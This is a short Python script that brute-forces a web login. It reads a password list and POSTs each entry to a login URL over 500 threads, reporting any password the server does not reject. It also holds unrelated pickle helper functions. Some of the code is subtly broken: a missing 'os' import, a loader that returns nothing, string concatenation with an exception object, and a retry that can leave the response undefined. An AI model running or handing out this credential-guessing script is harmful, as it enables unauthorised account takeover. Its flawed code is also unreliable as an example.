#!/usr/bin/env python3
import socket
import pickle
## For CPU intensive tasking, don't use dummy. Dummy is threading, which is only run on one core of your CPU.
from multiprocessing.dummy import Pool as ThreadPool 
import requests

## Make an object
class object:
    def __init__(self, param):
        self.param = param

## Saving & loading objects to/from disk
def save_object(obj, filename):
    with open(filename, 'wb') as output:
        pickle.dump(obj, output, pickle.HIGHEST_PROTOCOL)

def load_object(obj, filename):
    if os.path.isfile(filename):
        with open(filename, 'rb') as input:
            obj = pickle.load(input)

## Do whatever in parallel. Come back to this later with better syntax.
## It works, but doesn't limit the number of threads spun up. 
## Also doesn't handle blocking functions too well.
def thread_starter():
    with open('password-list.txt', 'rb') as f:
        passwords = f.read().splitlines()
    pool = ThreadPool(500)
    results = pool.map(start, passwords)
    pool.close()
    pool.join()

def start(password):
    password = password.decode('utf-8').strip()
    try:
        r = requests.post("http://target.url/login", data={'password':password})
    except Exception as e:
        print("Hit exception: " + e + " on password: " + password + ". Retrying.")
        start(password)
    if 'Invalid password' in r.text:
        print("Tried password " + password + ". Did not work.")
    else:
        print("### Password is: " + password + " ### ")
        print(r.text)

if __name__ == '__main__':
    thread_starter()
